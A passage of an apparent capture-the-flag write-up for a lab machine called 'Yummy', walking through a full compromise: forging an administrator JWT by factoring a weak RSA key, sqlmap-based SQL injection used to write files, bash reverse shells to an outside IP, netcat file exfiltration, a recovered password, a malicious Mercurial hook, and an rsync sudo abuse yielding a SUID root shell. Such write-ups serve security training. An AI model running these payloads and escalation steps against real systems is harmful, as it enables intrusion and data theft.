+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+
+timestamp=$(/usr/bin/date)
+service=mysql
+response=$(/usr/bin/systemctl is-active mysql)
+
+<span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable">$response</span>"</span> != <span class="hljs-string">'active'</span> ]; <span class="hljs-keyword">then</span>
+    /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"{\"status\": \"The database is down\", \"time\": \"<span class="hljs-variable">$timestamp</span>\"}"</span> &gt; /data/scripts/dbstatus.json
+    /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$service</span> is down, restarting!!!"</span> | /usr/bin/mail -s <span class="hljs-string">"<span class="hljs-variable">$service</span> is down!!!"</span> root
+    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2&gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
+    /bin/bash <span class="hljs-string">"<span class="hljs-variable">$latest_version</span>"</span>
+<span class="hljs-keyword">else</span>
+    <span class="hljs-keyword">if</span> [ -f /data/scripts/dbstatus.json ]; <span class="hljs-keyword">then</span>
+        <span class="hljs-keyword">if</span> grep -q <span class="hljs-string">"database is down"</span> /data/scripts/dbstatus.json 2&gt;/dev/null; <span class="hljs-keyword">then</span>
+            /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"The database was down at <span class="hljs-variable">$timestamp</span>. Sending notification."</span>
+            /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$service</span> was down at <span class="hljs-variable">$timestamp</span> but came back up."</span> | /usr/bin/mail -s <span class="hljs-string">"<span class="hljs-variable">$service</span> was down!"</span> root
+            /usr/bin/rm -f /data/scripts/dbstatus.json
+        <span class="hljs-keyword">else</span>
+            /usr/bin/rm -f /data/scripts/dbstatus.json
+            /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"The automation failed in some way, attempting to fix it."</span>
+            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2&gt;/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
+            /bin/bash <span class="hljs-string">"<span class="hljs-variable">$latest_version</span>"</span>
+        <span class="hljs-keyword">fi</span>
+    <span class="hljs-keyword">else</span>
+        /usr/bin/<span class="hljs-built_in">echo</span> <span class="hljs-string">"Response is OK."</span>
+    <span class="hljs-keyword">fi</span>
+<span class="hljs-keyword">fi</span>
+
+[ -f dbstatus.json ] &amp;&amp; /usr/bin/rm -f dbstatus.json</code></pre></div>
+<p>Does not exist on the server /data/scripts/dbstatus.json. I was trying to find .sql file, so I could not do so for an hour, so time to crack the app.</p>
+<p>In <code>/login</code> we can see how our token is created: <code>access_token = jwt.encode(payload, signature.key.export_key(), algorithm='RS256')</code>. Using <a title="https://jwt.io/" href="https://jwt.io/">jwt.io</a> we can decode it and see that it matches our expectations.</p>
+<p><img src="/_resources/1a645ca49b5f4a50b8e067e405475a80.png" /></p>
+<p>What is fun, is that sometimes the token is generated for me was <code>&lt;SNIP&gt;WY37Yzz6Ho46CVE</code>. Nice.</p>
+<h1 id="cracking-the-app">Cracking the app</h1>
+<p>I had no idea how JWT works, nor RS256 so had to educate myself a bit here. For a [TLDR] this is a good <a title="https://www.youtube.com/watch?v=UBUNrFtufWo" href="https://www.youtube.com/watch?v=UBUNrFtufWo">fireship video</a>. Then I’ve found <a title="https://www.youtube.com/watch?v=cZYFIipgBXg" href="https://www.youtube.com/watch?v=cZYFIipgBXg">Jan Goebel video</a> explaining RS256. It turns out it stands for RSA + SHA256. So the data is being sent as b64 encoded plain text (that is why <a title="https://jwt.io/" href="https://jwt.io/">jwt.io</a> is being able to decode it) and then at the bottom separated with a dot is attached first encrypted, then hashed message seen above. If you need a reminder of how rsa works, here is a <a title="https://www.cryptool.org/en/cto/rsa-step-by-step/" href="https://www.cryptool.org/en/cto/rsa-step-by-step/">great site</a>.</p>
+<p>Digging deeper in the source code we can find <code>verification.py</code></p>
+<div><pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python3</span>
+
+<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request, jsonify
+<span class="hljs-keyword">import</span> jwt
+<span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> signature
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_token</span>():
+    token = <span class="hljs-literal">None</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-string">"Cookie"</span> <span class="hljs-keyword">in</span> request.headers:
+        <span class="hljs-keyword">try</span>:
+            token = request.headers[<span class="hljs-string">"Cookie"</span>].split(<span class="hljs-string">" "</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">"X-AUTH-Token="</span>)[<span class="hljs-number">1</span>].replace(<span class="hljs-string">";"</span>, <span class="hljs-string">''</span>)
+        <span class="hljs-keyword">except</span>:
+            <span class="hljs-keyword">return</span> jsonify(message=<span class="hljs-string">"Authentication Token is missing"</span>), <span class="hljs-number">401</span>
+
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token:
+        <span class="hljs-keyword">return</span> jsonify(message=<span class="hljs-string">"Authentication Token is missing"</span>), <span class="hljs-number">401</span>
+
+    <span class="hljs-keyword">try</span>:
+        data = jwt.decode(token, signature.public_key, algorithms=[<span class="hljs-string">"RS256"</span>])
+        current_role = data.get(<span class="hljs-string">"role"</span>)
+        email = data.get(<span class="hljs-string">"email"</span>)
+        <span class="hljs-keyword">if</span> current_role <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> (<span class="hljs-string">"customer"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> current_role <span class="hljs-keyword">and</span> <span class="hljs-string">"administrator"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> current_role):
+            <span class="hljs-keyword">return</span> jsonify(message=<span class="hljs-string">"Invalid Authentication token"</span>), <span class="hljs-number">401</span>
+
+        <span class="hljs-keyword">return</span> (email, current_role), <span class="hljs-number">200</span>
+
+    <span class="hljs-keyword">except</span> jwt.ExpiredSignatureError:
+        <span class="hljs-keyword">return</span> jsonify(message=<span class="hljs-string">"Token has expired"</span>), <span class="hljs-number">401</span>
+    <span class="hljs-keyword">except</span> jwt.InvalidTokenError:
+        <span class="hljs-keyword">return</span> jsonify(message=<span class="hljs-string">"Invalid token"</span>), <span class="hljs-number">401</span>
+    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
+        <span class="hljs-keyword">return</span> jsonify(error=<span class="hljs-built_in">str</span>(e)), <span class="hljs-number">500</span></code></pre></div>
+<p>We can also find <code>signature.py</code>.</p>
+<div><pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python3</span>
+
+<span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA
+<span class="hljs-keyword">from</span> cryptography.hazmat.backends <span class="hljs-keyword">import</span> default_backend
+<span class="hljs-keyword">from</span> cryptography.hazmat.primitives <span class="hljs-keyword">import</span> serialization
+<span class="hljs-keyword">import</span> sympy
+
+
+<span class="hljs-comment"># Generate RSA key pair</span>
+q = sympy.randprime(<span class="hljs-number">2</span>**<span class="hljs-number">19</span>, <span class="hljs-number">2</span>**<span class="hljs-number">20</span>)
+n = sympy.randprime(<span class="hljs-number">2</span>**<span class="hljs-number">1023</span>, <span class="hljs-number">2</span>**<span class="hljs-number">1024</span>) * q
+e = <span class="hljs-number">65537</span>
+p = n // q
+phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)
+d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi_n)
+key_data = {<span class="hljs-string">'n'</span>: n, <span class="hljs-string">'e'</span>: e, <span class="hljs-string">'d'</span>: d, <span class="hljs-string">'p'</span>: p, <span class="hljs-string">'q'</span>: q}
+key = RSA.construct((key_data[<span class="hljs-string">'n'</span>], key_data[<span class="hljs-string">'e'</span>], key_data[<span class="hljs-string">'d'</span>], key_data[<span class="hljs-string">'p'</span>], key_data[<span class="hljs-string">'q'</span>]))
+private_key_bytes = key.export_key()
+
+private_key = serialization.load_pem_private_key(
+    private_key_bytes,
+    password=<span class="hljs-literal">None</span>,
+    backend=default_backend()
+)
+public_key = private_key.public_key()</code></pre></div>
+<p>With them we get complete overview of how the JWT token is generated and verified. We have to get in the middle of it and modify our role. To do so, we have to get the private key. In our case we are operating on relatively small numbers, so we can crack it using <a title="https://factordb.com/" href="https://factordb.com/">factordb</a>. The tool I used was <a title="https://github.com/RsaCtfTool/RsaCtfTool" href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a>, which used this site, but also had cracking techniques built in. I did not want to work too much on the script, so I am decoding jwt manually using <a title="jwt.io" href="jwt.io">jwt.io</a>, then running RsaCtfTool and then running the script with recieved data.</p>
+<ol>
+<li>
+<p>Get decoded data from jwt.io</p>
+</li>
+<li>
+<p>Get RSA private key</p>
+</li>
+</ol>
+<div><pre class="hljs"><code>~/vpy/bin/python3 /home/user/Desktop/yummy/RsaCtfTool/RsaCtfTool.py -n 91718719973617223958685224044018932678041127778096227737762523591810577392288839531332916507728741259438432329535236004349744981846983231890168148088786046554865802114936233706257314578799502219783073478627514629882870679287058027073912950399310255285118365691685566498479814015189660994432439335343986654038298327 --private</code></pre></div>
+<ol start="3">
+<li>Get new JWT</li>
+</ol>
+<div><pre class="hljs"><code><span class="hljs-keyword">import</span> jwt
+<span class="hljs-keyword">from</span> cryptography.hazmat.primitives <span class="hljs-keyword">import</span> serialization
+
+private_key_pem = <span class="hljs-string">b"""
+-----BEGIN RSA PRIVATE KEY-----
+MIICKgIBAAKBgwfI+lC8QiWKXyBEtGQLExGI1cma9D32RqtHK8eJ69na/w8O+tss
+24kmTYzHzSpBJHHXYiTKYbTAEPua8lm6wtA4OUhumT+FgBGwR009SbgeZdeXtJ/C
+xpZgIj96OzG6gKw4lvu/04JYqQx2b0ZTQQIDAgL6
+-----END RSA PRIVATE KEY-----
+"""</span>
+
+private_key = serialization.load_pem_private_key(
+    private_key_pem,
+    password=<span class="hljs-literal">None</span>,
+)
+
+header = {
+    <span class="hljs-string">"alg"</span>: <span class="hljs-string">"RS256"</span>,
+    <span class="hljs-string">"typ"</span>: <span class="hljs-string">"JWT"</span>
+}
+
+payload = {
+    <span class="hljs-string">"email"</span>: <span class="hljs-string">"1@1.com"</span>,
+    <span class="hljs-string">"role"</span>: <span class="hljs-string">"administrator"</span>,
+    <span class="hljs-string">"iat"</span>: <span class="hljs-number">1730153314</span>,
+    <span class="hljs-string">"exp"</span>: <span class="hljs-number">1730156914</span>,
+    <span class="hljs-string">"jwk"</span>: {
+        <span class="hljs-string">"kty"</span>: <span class="hljs-string">"RSA"</span>,
+        <span class="hljs-string">"n"</span>: <span class="hljs-string">"91718719973617223958685224044018932678041127778096227737762523591810577392288839531332916507728741259438432329535236004349744981846983231890168148088786046554865802114936233706257314578799502219783073478627514629882870679287058027073912950399310255285118365691685566498479814015189660994432439335343986654038298327"</span>,
+        <span class="hljs-string">"e"</span>: <span class="hljs-number">65537</span>
+    }
+}
+
+jwt_token = jwt.encode(payload, private_key, algorithm=<span class="hljs-string">"RS256"</span>, headers=header)
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">"Generated JWT:"</span>)
+<span class="hljs-built_in">print</span>(jwt_token)</code></pre></div>
+<ol start="4">
+<li>Replace data in cookie and access <code>/admindashboard</code>.</li>
+</ol>
+<p>It works! If we change our cookie, we can now access <code>/admindashboard</code> without password.</p>
+<h1 id="abusing-admin-panel">Abusing admin panel</h1>
+<p><img src="/_resources/dad4626b25fa4d91ac95a7addee98e3a.png" /></p>
+<p>Then as we know from the source code, we can now do sql injection on the <code>o</code> parameter of <code>http://yummy.htb/admindashboard?s=a&amp;o=ASC</code>. Running SQLmap, it diagnoses it as time-based. We can retrieve <code>users</code> table.</p>
+<div><pre class="hljs"><code>Parameter: <span class="hljs-comment">#1* (URI)</span>
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind <span class="hljs-params">(query SLEEP)</span>
+    Payload: http:<span class="hljs-string">//yummy.htb/admindashboard</span>?s=hi&amp;o= AND <span class="hljs-params">(SELECT 7341 FROM (SELECT(SLEEP(5)</span>))ltOy)
+
+
+Database: yummy_db
+Table: users
+[0 entries]
++<span class="hljs-params">----</span>+<span class="hljs-params">---------</span>+<span class="hljs-params">-------</span>+<span class="hljs-params">----------</span>+
+| id | role_id | email | password |
++<span class="hljs-params">----</span>+<span class="hljs-params">---------</span>+<span class="hljs-params">-------</span>+<span class="hljs-params">----------</span>+
++<span class="hljs-params">----</span>+<span class="hljs-params">---------</span>+<span class="hljs-params">-------</span>+<span class="hljs-params">----------</span>+</code></pre></div>
+<p>There is nothing interesting in the database, so we have to dig deeper. We have to abuse now the <code>dbmonitor.sh</code> script, as that’s the only thing we have left. In it, we can see that it is executing newest script starting with …, when there is an unknown error in the log file. So let’s do just that, using sqlmap generate script which will grant us reverse shell and trigger it by creating a file.</p>
+<p>Here is the relevant part of <code>dbmonitor.sh</code></p>
+<div><pre class="hljs"><code>
+  <span class="hljs-keyword">if</span> [ -f <span class="hljs-regexp">/data/</span>scripts/dbstatus.json ]; then
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">grep</span> -q <span class="hljs-string">"database is down"</span>
+        &lt;SNIP&gt;
+        <span class="hljs-keyword">else</span> 
+         latest_version=$(<span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/ls -1 /</span>data<span class="hljs-regexp">/scripts/</span>fixer-v* <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> | <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/sort -V | /u</span>sr<span class="hljs-regexp">/bin/</span>tail -n <span class="hljs-number">1</span>)
+         <span class="hljs-regexp">/bin/</span>bash <span class="hljs-string">"$latest_version"</span>
+        &lt;SNIP&gt;</code></pre></div>
+<div><pre class="hljs"><code>sqlmap -r tmp.req <span class="hljs-attribute">--dbms</span>=MySQL <span class="hljs-attribute">--technique</span>=T <span class="hljs-attribute">--level</span>=5 <span class="hljs-attribute">--risk</span>=3 <span class="hljs-attribute">--file-write</span>=dbstatus.json <span class="hljs-attribute">--file-dest</span>=/data/scripts/dbstatus.json --hex
+
+sqlmap -r tmp.req <span class="hljs-attribute">--dbms</span>=MySQL <span class="hljs-attribute">--level</span>=5 <span class="hljs-attribute">--risk</span>=3 <span class="hljs-attribute">--file-write</span>=fixer-vpwned.sh <span class="hljs-attribute">--file-dest</span>=/data/scripts/fixer-vpwned.sh --hex</code></pre></div>
+<p>Newly created <code>dbstatus.json</code></p>
+<div><pre class="hljs"><code><span class="hljs-punctuation">{</span>
+    <span class="hljs-attr">"status"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Unexpected error in database"</span><span class="hljs-punctuation">,</span>
+    <span class="hljs-attr">"time"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Mon Oct 23 10:15:42 UTC 2024"</span>
+<span class="hljs-punctuation">}</span></code></pre></div>
+<p>fixer-vpwned.sh</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+bash -i &gt;&amp; /dev/tcp/10.10.16.21/4444 0&gt;&amp;1</code></pre></div>
+<p>On our host <code>nc -lvnp 4444</code> and we are finally in. Checking our directory, we can see that there are no scripts that we can execute.</p>
+<div><pre class="hljs"><code>mysql@yummy:/data/scripts$ ls -la
+drwxrwxrwx<span class="hljs-number"> 2 </span>root  root <span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 30 </span>11:45 .
+drwxr-xr-x<span class="hljs-number"> 3 </span>root  root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 30 </span>08:16 ..
+-rw-r--r--<span class="hljs-number"> 1 </span>root  root   <span class="hljs-number"> 90 </span>Sep<span class="hljs-number"> 26 </span>15:31 app_backup.sh
+-rw-r--r--<span class="hljs-number"> 1 </span>root  root <span class="hljs-number"> 1336 </span>Sep<span class="hljs-number"> 26 </span>15:31 dbmonitor.sh
+-rw-rw-r--<span class="hljs-number"> 1 </span>mysql mysql<span class="hljs-number"> 1024 </span>Oct<span class="hljs-number"> 30 </span>11:12 .dbmonitor.sh.swp
+-rw-r-----<span class="hljs-number"> 1 </span>root  root   <span class="hljs-number"> 60 </span>Oct<span class="hljs-number"> 30 </span>11:45 fixer-v1.0.1.sh
+-rw-r--r--<span class="hljs-number"> 1 </span>root  root <span class="hljs-number"> 5570 </span>Sep<span class="hljs-number"> 26 </span>15:31 sqlappointments.sql
+-rw-r--r--<span class="hljs-number"> 1 </span>root  root  <span class="hljs-number"> 114 </span>Sep<span class="hljs-number"> 26 </span>15:31 table_cleanup.sh</code></pre></div>
+<p>Going back to the <code>crontab</code>, we can see that one of the scripts is being executed as <code>www-data</code>, so that’s how we can get user.</p>
+<p><code>*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh</code></p>
+<p>We can’t modify this file, but we can remove it and create new one.</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">mysql</span>@yummy:/data$ ls -l
+<span class="hljs-attribute">drwxrwxrwx</span> <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Oct <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">45</span> scripts</code></pre></div>
+<p>So we can just setup on our host <code>nc -lvnp 5555</code> and then run on the target <code>rm app_backup.sh &amp;&amp; echo "bash -i &gt;&amp; /dev/tcp/10.10.16.21/5555 0&gt;&amp;1" &gt; app_backup.sh</code>.</p>
+<p><img src="/_resources/fd3fa4d4d4f44b45861feccb67b27417.png" /></p>
+<p>We are now logged in as www-data, but we still can’t access any of the user folders. In our home directory, there is only one new folder, <code>app-qatesting</code>, owned by <code>qa</code>. In it, we can see all of the same files as in our <code>backuppapp.zip</code>, except for folder <code>.hg</code>.</p>
+<div><pre class="hljs"><code>www-data@yummy:~/app-qatesting$ ls -la
+drwxrwx---<span class="hljs-number"> 7 </span>www-data qa       <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:41 .
+drwxr-xr-x<span class="hljs-number"> 3 </span>www-data www-data <span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 30 </span>12:02 ..
+-rw-rw-r--<span class="hljs-number"> 1 </span>qa       qa      <span class="hljs-number"> 10852 </span>May<span class="hljs-number"> 28 </span>14:37 app.py
+drwxr-xr-x<span class="hljs-number"> 3 </span>qa       qa       <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:26 config
+drwxrwxr-x<span class="hljs-number"> 6 </span>qa       qa       <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:37 .hg
+drwxr-xr-x<span class="hljs-number"> 3 </span>qa       qa       <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:26 middleware
+drwxr-xr-x<span class="hljs-number"> 6 </span>qa       qa       <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:26 static
+drwxr-xr-x<span class="hljs-number"> 2 </span>qa       qa       <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:26 templates</code></pre></div>
+<div><pre class="hljs"><code>www-data@yummy:~/app-qatesting/.hg$ ls -la
+drwxrwxr-x<span class="hljs-number"> 6 </span>qa       qa<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:37 .
+drwxrwx---<span class="hljs-number"> 7 </span>www-data qa<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:41 ..
+-rw-rw-r--<span class="hljs-number"> 1 </span>qa       qa  <span class="hljs-number"> 57 </span>May<span class="hljs-number"> 28 </span>14:26 00changelog.i
+-rw-rw-r--<span class="hljs-number"> 1 </span>qa       qa   <span class="hljs-number"> 0 </span>May<span class="hljs-number"> 28 </span>14:28 bookmarks
+-rw-rw-r--<span class="hljs-number"> 1 </span>qa       qa   <span class="hljs-number"> 8 </span>May<span class="hljs-number"> 28 </span>14:26 branch
+drwxrwxr-x<span class="hljs-number"> 2 </span>qa       qa<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:37 cache
+-rw-rw-r--<span class="hljs-number"> 1 </span>qa       qa<span class="hljs-number"> 7102 </span>May<span class="hljs-number"> 28 </span>14:37 dirstate
+-rw-rw-r--<span class="hljs-number"> 1 </span>qa       qa  <span class="hljs-number"> 34 </span>May<span class="hljs-number"> 28 </span>14:37 last-message.txt
+-rw-rw-r--<span class="hljs-number"> 1 </span>qa       qa  <span class="hljs-number"> 11 </span>May<span class="hljs-number"> 28 </span>14:26 requires
+drwxrwxr-x<span class="hljs-number"> 4 </span>qa       qa<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:37 store
+drwxrwxr-x<span class="hljs-number"> 2 </span>qa       qa<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:28 strip-backup
+-rw-rw-r--<span class="hljs-number"> 1 </span>qa       qa   <span class="hljs-number"> 8 </span>May<span class="hljs-number"> 28 </span>14:26 undo.backup.branch.bck
+-rw-rw-r--<span class="hljs-number"> 1 </span>qa       qa<span class="hljs-number"> 7102 </span>May<span class="hljs-number"> 28 </span>14:34 undo.backup.dirstate.bck
+-rw-rw-r--<span class="hljs-number"> 1 </span>qa       qa   <span class="hljs-number"> 9 </span>May<span class="hljs-number"> 28 </span>14:37 undo.desc
+drwxrwxr-x<span class="hljs-number"> 2 </span>qa       qa<span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 28 </span>14:37 wcache</code></pre></div>
+<p>We can zip it with <code>zip -r qa.zip app-qatesting</code> and send over using netcat.</p>
+<div><pre class="hljs"><code><span class="hljs-comment"># on victim</span>
+nc 10.10.14.134 2222 &lt; qa.zip
+
+<span class="hljs-comment"># on host</span>
+nc -l -p 2222 &gt; qa.zip</code></pre></div>
+<p>Looking for interesting content, we can find <code>app.py.i</code>.</p>
+<div><pre class="hljs"><code><span class="hljs-variable">$grep</span> -r <span class="hljs-string">"password"</span> ./.hg
+grep: ./.hg/store/data/app.py.i: binary file matches</code></pre></div>
+<p><img src="/_resources/5ae1fc0caefb43fc8f9a59f5cac318ac.png" /></p>
+<p>We finally get:<br />
+‘user’: ‘qa’<br />
+‘password’: ‘jPAd!XQCtn8Oc@2B’</p>
+<p>We finally get user flag.</p>
+<p><img src="/_resources/416ac844bb8c4be4b4db3f9110ffef8d.png" /></p>
+<h1 id="getting-step-closer-to-root">Getting (step closer to) Root</h1>
+<p>In our home folder we can find file called <code>.hgrc</code>.</p>
+<div><pre class="hljs"><code># example <span class="hljs-keyword">user</span> config (see <span class="hljs-string">'hg help config'</span> <span class="hljs-keyword">for</span> more <span class="hljs-keyword">info</span>)
+[ui]
+username = qa
+
+[<span class="hljs-keyword">trusted</span>]
+users = qa, dev
+<span class="hljs-keyword">groups</span> = qa, dev</code></pre></div>
+<p>Running <code>man hg</code> tells us that it is a <code>Mercurial source code management system</code>. Mercurial is a lesser known alternative to git, so pheraps we can find something interesting using it. That theory is even more likely to be true, as we can run hg as dev.</p>
+<div><pre class="hljs"><code>qa@yummy:~$ sudo -l
+[sudo] password <span class="hljs-keyword">for</span> qa: 
+Matching Defaults entries <span class="hljs-keyword">for</span> qa on localhost:
+    env_reset, mail_badpass, secure_path=/usr/<span class="hljs-built_in">local</span>/sbin\:/usr/<span class="hljs-built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User qa may run the following commands on localhost:
+    (dev : dev) /usr/bin/hg pull /home/dev/app-production/</code></pre></div>
+<p>Looking for ways to execute code using Mercurial, I’ve found that it has hooks. Hooks can be executed when some of the events happen, i.e pre-pull or post-pull. They are being set up in .hgrc in hooks section, located in current dir. That is probably our way in.</p>
+<p>We need to find a dir that is both accessible for us and dev, as we will pull as him, so <code>/tmp</code> works. Then we need to create new <code>.hg</code> folder, so that we can run <code>hg</code>. Next, copy <code>~/.hgrc</code> to our new hg dir using <code>cp ~/.hgrc /tmp/.hg/hgrc</code>. Having <code>hgrc</code> that is a hidden file is <a title="https://www.mercurial-scm.org/doc/hgrc.5.html" href="https://www.mercurial-scm.org/doc/hgrc.5.html">not standard</a> and I do not understand why was it like that at the beginning. At the end, we just modify our <code>hgrc</code> and run <code>sudo -u dev /usr/bin/hg pull /home/dev/app-production/</code>.</p>
+<p>I did that, just to be meet with <code>abort: pre-pull hook exited with status 2</code> as it turns out that the hook does not like executing <code>/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.24/4242 0&gt;&amp;1</code> for some reason. So we just have to put it in a file and run again</p>
+<p>hgrc:</p>
+<div><pre class="hljs"><code><span class="hljs-section">[ui]</span>
+<span class="hljs-attr">username</span> = qa
+
+<span class="hljs-section">[trusted]</span>
+<span class="hljs-attr">users</span> = qa, dev
+<span class="hljs-attr">groups</span> = qa, dev
+
+<span class="hljs-section">[hooks]</span>
+<span class="hljs-attr">pre-pull</span> = /tmp/pwned.sh</code></pre></div>
+<p>Then we get <code>dev</code> shell.</p>
+<div><pre class="hljs"><code>$nc -lvnp <span class="hljs-number">4242</span>
+listening <span class="hljs-keyword">on</span> [any] <span class="hljs-number">4242</span> ...
+connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.24</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span><span class="hljs-number">.231</span><span class="hljs-number">.153</span>] <span class="hljs-number">56468</span>
+I'm <span class="hljs-keyword">out of</span> office <span class="hljs-keyword">until</span> November  <span class="hljs-number">1</span>th, don't call <span class="hljs-keyword">me</span></code></pre></div>
+<h1 id="getting-root">Getting Root</h1>
+<div><pre class="hljs"><code>dev@yummy:~$ sudo -l
+Matching Defaults entries for dev on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User dev may run the following commands on localhost:
+    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/</code></pre></div>
+<p>Looking at <a title="https://gtfobins.github.io/gtfobins/rsync/" href="https://gtfobins.github.io/gtfobins/rsync/">gtfobins.github.io</a>, we can see that if we have sudo, we can get arbitrary code execution by running <code>./rsync -e 'sh -p -c "sh 0&lt;&amp;2 1&gt;&amp;2"' 127.0.0.1:/dev/null</code>. I tried for a long time to modify it and run <code>sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/ -e 'sh -c "sh 0&lt;&amp;2 1&gt;&amp;2"' 127.0.0.1:/dev/null</code>, but I did not menage to get root. When running it without sudo, it does spawn a shell. When running with sudo, it allows for writing, but does not respond to it. What I learned later, is that it did ask for password, but did not show it. We can see that after running the same command, but after connecting via ssh to dev. To do so just run on dev:</p>
+<div><pre class="hljs"><code>ssh-keygen -C dev
+cat ~/.ssh/id_ed25519.pub &gt;&gt; ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys</code></pre></div>
+<p>Looking at <a title="https://security.stackexchange.com/questions/235290/how-bad-is-rsync-with-no-password-sudo" href="https://security.stackexchange.com/questions/235290/how-bad-is-rsync-with-no-password-sudo">infosec stackexchange</a>, we can see that there should be a way nontheless. We know that we can append any flag we want, so let’s see what’s in help.</p>
+<p>There is some fun stuff in there like:</p>
+<div><pre class="hljs"><code>--chmod=CHMOD            affect file<span class="hljs-built_in"> and/or </span>directory permissions
+--chown=USER:GROUP       simple username/groupname mapping</code></pre></div>
+<p>From here it’s seems to be easy. I tried creating file with <code>chmod 4777 /bin/bash</code>, chmoding it to 4777 and chown to root. Well, not as easy as there is a script cleaning our <code>app-production</code> directory. That was not pleasant, as the dirs are being cleaned fast and at the end we get <code>chmod: changing permissions of '/bin/bash': Operation not permitted</code>.</p>
+<p>I tried to get somehow root revshell, but did not succeed either. What worked for me finally, was copying the shell, giving it suid and then copying it with rsync. To avoid fighting with the cleaner, I just run a script and finally got root.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
+cp /bin/bash /home/dev/app-production/rootshell
+chmod 4777 /home/dev/app-production/rootshell
+sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/ --chown root:root /opt/app/
+/opt/app/rootshell -p</code></pre></div>
+<p>One of the best boxes that I’ve done so far.</p>
+<h1 id="apppy">app.py</h1>
+<div><pre class="hljs"><code><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, send_file, render_template, redirect, url_for, flash, jsonify, make_response
+<span class="hljs-keyword">import</span> tempfile
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">import</span> shutil
+<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta, timezone
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
+<span class="hljs-keyword">from</span> ics <span class="hljs-keyword">import</span> Calendar, Event
+<span class="hljs-keyword">from</span> middleware.verification <span class="hljs-keyword">import</span> verify_token
+<span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> signature
+<span class="hljs-keyword">import</span> pymysql.cursors
+<span class="hljs-keyword">from</span> pymysql.constants <span class="hljs-keyword">import</span> CLIENT
+<span class="hljs-keyword">import</span> jwt
+<span class="hljs-keyword">import</span> secrets
+<span class="hljs-keyword">import</span> hashlib
+
+app = Flask(__name__, static_url_path=<span class="hljs-string">'/static'</span>)
+temp_dir = <span class="hljs-string">''</span>
+app.secret_key = secrets.token_hex(<span class="hljs-number">32</span>)
+
+db_config = {
